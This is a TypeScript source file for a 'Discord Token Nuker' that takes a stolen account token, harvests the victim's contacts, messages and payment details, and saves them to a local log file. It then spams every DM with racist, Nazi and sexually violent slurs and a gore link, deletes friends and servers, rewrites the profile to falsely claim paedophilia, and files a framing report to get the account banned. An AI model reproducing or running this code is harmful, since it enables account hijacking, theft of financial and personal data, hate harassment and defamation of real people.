import fs from "node:fs";
import axios, {AxiosResponse, AxiosRequestConfig} from "axios";
import ora, {Ora} from "ora";
import chalk from "chalk";
import util from "node:util";
import yaml from "yaml";
import readline from 'node:readline/promises'

class BillingInfo {
     public "Type": string = "";
     public "Country": string = "";
     public "Region": string = "";
     public "City": string = "";
     public "ZIP Code": string = "";
     public "Address": string = "";
     public "Expires": string = "";
     public "Billing Name": string = "";
     public "Email": string = "";
     public "Brand": string = "";
     public "Last 4 Digits": string = "";
     public "Valid": string = "false";
}
 
class UserInfo {
     public "Basic Info" = {
         "Displayname": "",
         "Username": "",
         "Discriminator": "None",
         "User ID": "",
         "Email": "",
         "Phone Number": ""
     };
     public "Friends": any = {}
     public "Servers": any = {}
     public "Billing Information" = {
          "Has Nitro?": "No",
          "Payments": new Array<BillingInfo>
     };
     public "Gifts" = {};
     public "Channels" = new Array<string | number>;
     public "Direct Messages" = {};
}

function clear_empty(data: any) {
     if (!(data instanceof Object) && !(data instanceof Array)) {
          return;
     }
     Object.keys(data).forEach((k) => {
          let v = data[k];
          if (v == null || v == "" || util.isDeepStrictEqual(v, []) || util.isDeepStrictEqual(v, {})) {
               data[k] = null;
               clear_empty(v);
          }
     })
}

function orainput(question: string) {
     return ora(chalk.red(question));
}

function pad(x: string) {
     return chalk.red(("").repeat(25) + x);
}
 

process.title = "Discord Token Nuker | Made by @nekovada on discord";

async function headerinit(auth: string, json?: any): Promise<AxiosRequestConfig> {
     return {
          headers: {
               Authorization: auth
          }
     }
}

async function nuke(token: string): Promise<boolean> {
     let data = new UserInfo();
     const headers: AxiosRequestConfig = await headerinit(token)
     {
          let ui: any;
          {
               let notif: Ora = orainput("Validating token...");
               let info = await axios.get("https://discord.com/api/users/@me", headers)
               notif.start();
               if (info.status != 200) {
                    notif.fail("Error! Token is invalid...");
                    return false;
               }
               ui = info;
               notif.succeed("Successfully validated token");
          }
          let notif: Ora = orainput("Getting basic info...").start();
          let user: string = ui.data["Username"]
          data["Basic Info"]["Discriminator"] = !(user.match(/[a-z]#0000/)) ? user.substring(user.length - 6, user.length) : "None";
          data["Basic Info"]["Username"] = user.match(/[a-z]#0000/) ? `@${user.substring(user.length - 6)}` : user.substring(user.length - 6); 
          data["Basic Info"]["User ID"] = ui["id"];
          data["Basic Info"]["Email"] = ui["email"] || "None provided";
          data["Basic Info"]["Phone Number"] = ui["phone"]
          notif.succeed();
     }
     let notif: Ora = orainput("Getting gifts...").start();
     axios.get("https://discord.com/api/users/@me/entitlements/gifts", headers).then((res: AxiosResponse<Response>) => {
          data["Gifts"] = res.data;
          notif.succeed();
     }).catch(() => notif.fail());
     let fnotif: Ora = orainput("Logging friends...");
     await axios.get("https://discord.com/api/users/@me/relationships", headers).then((res: AxiosResponse<Response>) => {
          data["Friends"] = res.data;
          fnotif.succeed();
     }).catch(() => fnotif.fail());

     let pnotif: Ora = orainput("Getting payment info...").start();
     axios.get("https://discord.com/api/users/@me/billing/payment-sources", headers).then((res: AxiosResponse<Response>) => {
          res.data.json().then((v) => {
               for (let card of v) {
                    let cred = new BillingInfo();
                    if (card["type"] == 1) {
                         cred["Type"] = "Credit Card";
                         cred["Country"] = card["billing_address"]["country"];
                         cred["Expires"] = `${card["expires_month"]}/${card["expires_year"]}`;
                         cred["Last 4 Digits"] = card["last_4"];
                         cred["Valid"] = !card["Invalid"] ? "True" : "False"
                         cred["Billing Name"] = card["billing_address"]["billing_name"];
                         cred["Brand"] = card["brand"];
                         cred["City"] = card["billing_address"]["city"];
                         cred["ZIP Code"] = card["billing_address"]["postal_code"];
                         cred["Region"] = card["billing_address"]["state"];
                         cred["Address"] = card["billing_address"]["line_1"];
                    } else {
                         cred["Email"] = card["billing_address"]["email"];
                         cred["Valid"] = !card["valid"] ? "True" : "False";
                         cred["City"] = card["billing_address"]["city"];
                         cred["Billing Name"] = card["billing_address"]["billing_name"];
                         cred["Country"] = card["billing_address"]["country"];
                         cred["Region"] = card["billing_address"]["state"];
                         cred["Type"] = "PayPal";
                         cred["Address"] = card["billing_address"]["line_1"];
                         cred["ZIP Code"] = card["billing_address"]["postal_code"];
                    }
                    data["Billing Information"]["Payments"].push(card)
               }
          });
     }).catch(() => pnotif.fail());

     let guildnotif: Ora = orainput("Retrieving guilds...");
     await axios.get("https://discord.com/api/users/@me/guilds", headers).then((res: AxiosResponse<Response>) => {
          data["Servers"] = res.data;
          guildnotif.succeed();
     });

     let unlucky = data["Friends"][Math.floor(Math.random() * Object.keys(data["Friends"]).length)];
     let unluckychannel = "";
     let dmnotif: Ora = orainput("Retrieving dms...").start();
     await axios.get("https://discord.com/api/users/@me/channels", headers).then((res: AxiosResponse<Response>) => {
          res.data.json().then((channels: any) => {
               for (let chan in channels) {
                    let channel: any = chan as any
                    data["Channels"].push(channel["id"])
                    axios.get(`https://discord.com/api/channels/${channel["id"]}/search?author=${unlucky["id"]}`).then((res) => {
                         if (res["total_messages"] != 0) {
                              unluckychannel = channel["id"]
                         }
                    })
                    for (let i = 1; i <= 3; ++i) {
                         axios.get(`https://discord.com/api/channels/${channel["id"]}/search?offset=${i * 25}`).then((res) => {
                              if (data["Direct Messages"][channel["id"]] == undefined) {
                                   data["Direct Messages"][channel["id"]] = {} as any;
                              }
                              for (let message in res["messages"]) {
                                   let msgs = data["Direct Messages"][channel["id"]];
                                   msgs[Object.keys(msgs).length - 1] = message;
                              }
                         });
                    }
               }
          })
     });

     let fkill: Ora = orainput("Spamming dms...").start();
     let fri = 0;
     await axios.get("https://discord.com/api/users/@me/channels", headers).then(async (res) => {
          for (let channel of res.data) {
               for (let _ = 0; _ <= 10; ++_) {
                    await new Promise<void>(res => axios.post(`https://discord.com/api/users/@me/channels/${channel["id"]}/messages`, {"message": `Boo Hoo Packwatch lil nigga <@${data["Basic Info"]["User ID"]}> got gang raped by me and anti furry com\nRest in piss nigga kys you won't be missed\nHEIL HITLER\n||@everyone||https://goresee.com/w/myViHMqvTT1ptXxZQB6oem`}, headers).catch((res) => {
                         console.log(chalk.red("Rahh we are being rate limited\nSleeping for a few seconds..."));
                         setTimeout(() => res(), 1000);
                    }).then(() => res()));
               }
               fri += 1;
          }
     });

     for (let friend of data["Friends"]) {
          axios.delete(`https://discord.com/api/users/@me/relationships/${friend["id"]}`, headers)
     }

     fkill.succeed(pad(`Successfully raided ${fri} dms`));
     
     let dmc: Ora = orainput("Closing DMs").start();
     let cc: number = 0;
     for (let channel of data["Channels"]) {
          axios.delete(`https://discord.com/api/channels/${channel}`, headers);
          cc += 1;
     }
     dmc.succeed(pad(`Closed ${cc} dms`));

     let srvd: Ora = orainput("Leaving servers...").start();
     let srvc: number = 0;
     for (let guild of data["Servers"]) {
          if (guild["owner"])
               axios.post(`https://discord.com/api/guild/${guild["id"]}/delete`, {}, headers);
          else
               axios.delete(`https://discord.com/api/guilds/${guild["id"]}`, headers);
          srvc += 1;
     }
     srvd.succeed(pad(`Left ${srvc} servers`));
     let defd: Ora = orainput("Vandalizing account...");
     await axios.patch("https://discord.com/api/users/@me/settings", {"bio": "I really love kids, I cant hold this in anymore I am a MAP\nI also have membership in the ku klux klan and are a registered sex offender and hang niggers daily"}, headers);
     await axios.patch("https://discord.com/api/users/@me", {"custom-status": "Honestly, black people are subhuman, I think kids should be used as sex slaves too."}, headers);
     defd.succeed("Successfuly vandalized account...");
     let banfd: Ora = orainput("Terming account...").start();
     await axios.post(`https://discord.com/api/users/@me/channels/${unlucky["id"]}/messages`, { "message": "I am 8 years old please don't tell anybody" }, headers).then(async () => {
          axios.post("https://discord.com/api/v6/report", {
               "channel_id": unluckychannel,
               "guild_id": unluckychannel,
               "message_id": (await axios.get(`https://discord.com/api/channels/${unluckychannel}/messages/search?offset=25`)).data["messages"][0]
          }).then(() => banfd.succeed()).catch(() => banfd.fail());
     });
     let logf: Ora = orainput("Logging data...").start();
     clear_empty(data);
     fs.writeFile(`./LOG-NUKE-${data["Basic Info"]["User Id"]}.yaml`, yaml.stringify(data), (err) => logf.fail(`Failed to write file with error: ${err?.message || "No error provided"}`));
     logf.succeed();
     return true;
}

async function main() {
     console.log(chalk.red(`

          ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
          █░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░████░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███
          █░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░██░░▄▀░░████░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
          █░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░████░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░░░░░▄▀░░██░░▄▀░░████░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░████░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░██░░▄▀░░░░░░▄▀░░████░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████
          █████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█
          █████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░░░░░░░░░▄▀░░████░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█
          █████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░████░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█
          ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⣻⠋⠉⠉⠉⠙⠛⡛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠀⠀⠀⠀⠀⢠⣿⡀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠟⠀⠀⠀⠀⠀⠘⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣦⠀⠀⠀⠀⣴⣶⣷⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣷⣄⠀⢀⣴⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠀⠀⣼⣿⣿⣿⣿⣿⡄⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
                                                  ⠀⠀⠀⢠⣾⣿⣿⣿⣿⠋⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣾⡏⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡀⢠⣿⣿⣿⣿⣿⣿⡇⠀⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⡄⠀⠀⠀
                                                  ⠀⠀⢠⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣄⠀⠀⣿⣿⣿⣿⣿⣿⣿⠇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡄⠀⠀
                                                  ⠀⢀⣾⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣷⣄⢿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⣴⣾⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣷⡀⠀
                                                  ⠀⣸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠙⣿⣿⣿⣿⡟⠀⠀⢸⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣧⠀
                                                  ⢠⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠁⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⡆
                                                  ⢸⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⢀⣠⣤⣤⣀⡀⠀⠀⢹⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣇
                                                  ⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃⠀⢘⣿⣿⣿⣿⣿⣿⣷⣤⣾⣿⠿⠿⣿⣿⣿⣶⣄⠘⢿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⢀⣴⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠈⠹⣿⣿⣿⣦⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⠀⠀⠙⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠁⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣷⣄⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⢿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿
                                                  ⢹⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡏
                                                  ⠘⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠙⢿⣿⣿⣿⣿⣿⣯⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠇
                                                  ⠀⢹⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡟⠀
                                                  ⠀⠈⢿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣦⣀⠀⠀⣿⣿⣿⠀⠀⠀⣀⣼⣿⣿⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡿⠁⠀
                                                  ⠀⠀⠘⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣶⣿⣿⣿⣦⣶⣾⣿⡿⠛⠁⠀⠙⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠃⠀⠀
                                                  ⠀⠀⠀⠘⢿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⣿⣿⣿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⣠⣿⣿⣿⣿⣿⠃⠀⠀⠀
                                                  ⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣽⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣤⣤⣤⣟⣉⣀⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                                 ▄︻デ══━一 :3 :3
                                                                 WELCOME TO TOKEN NUKER, SOLDIER!
                                                                 PART OF ANTI-FURRY STARTERPACK MADE BY VYN
                                                                 FOR SUPPORT MESSAGE @NEKOVADA
     

                         ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄
                         ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░
                         
`));
     let io: readline.Interface = readline.createInterface(process.stdin, process.stdout);
     while (true) {
          const token = await io.question(pad("Enter your token >> "));
          try {
               let time = Date.now();
               if (await nuke(token.toString())) {
                    console.log(pad(`Successfully nuked token in ${(Date.now() - time)/1000} seconds`));
                    continue;
               }
          } catch {
               console.warn(pad("Invalid token!!"));
               continue;
          }
     }
}

if (require.main === module) {
     main();
}